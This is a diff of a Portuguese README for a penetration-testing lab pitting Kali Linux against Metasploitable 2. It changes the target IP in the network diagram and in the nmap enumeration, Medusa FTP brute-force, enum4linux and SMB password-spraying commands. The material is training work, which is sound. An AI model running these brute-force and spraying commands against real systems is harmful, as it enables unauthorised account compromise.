@@ -26,7 +26,7 @@ O foco não é apenas executar ataques, mas **entender o mecanismo, o impacto e 
 ```
 ┌─────────────────────┐        Host-Only Network         ┌─────────────────────────┐
 │    Kali Linux       │ ─────────────────────────────── │    Metasploitable 2     │
-│  192.168.56.100     │                                  │    192.168.56.101       │
+│  192.168.56.100     │                                  │    192.168.56.102       │
 │   (Atacante)        │                                  │    (Alvo)               │
 │                     │                                  │                         │
 │  - Medusa           │                                  │  - FTP  (porta 21)      │
@@ -59,7 +59,7 @@ sudo netdiscover -r 192.168.56.0/24
 4. Enumeração inicial de serviços:
 
 ```bash
-nmap -sV -p 21,22,80,139,445 192.168.56.101
+nmap -sV -p 21,22,80,139,445 192.168.56.102
 ```
 
 **Resultado da enumeração:**
@@ -75,7 +75,7 @@ nmap -sV -p 21,22,80,139,445 192.168.56.101
 ### Comando utilizado:
 
 ```bash
-medusa -h 192.168.56.101 -u msfadmin -P wordlists/passwords.txt -M ftp -O logs/ftp-results.txt
+medusa -h 192.168.56.102 -u msfadmin -P wordlists/passwords.txt -M ftp -O logs/ftp-results.txt
 ```
 
 ### Parâmetros explicados:
@@ -124,16 +124,16 @@ Aplicações web sem rate limiting permitem brute force irrestrito — vulnerabi
 
 ```bash
 # Ferramenta moderna (recomendada)
-enum4linux-ng -A 192.168.56.101
+enum4linux-ng -A 192.168.56.102
 
 # Alternativa legada
-enum4linux -a 192.168.56.101
+enum4linux -a 192.168.56.102
 ```
 
 ### Ataque password spraying:
 
 ```bash
-medusa -h 192.168.56.101 -U wordlists/users.txt -p "123456" -M smbnt -O logs/smb-results.txt
+medusa -h 192.168.56.102 -U wordlists/users.txt -p "123456" -M smbnt -O logs/smb-results.txt
 ```
 
 ### Por que password spraying é mais perigoso que brute force puro?
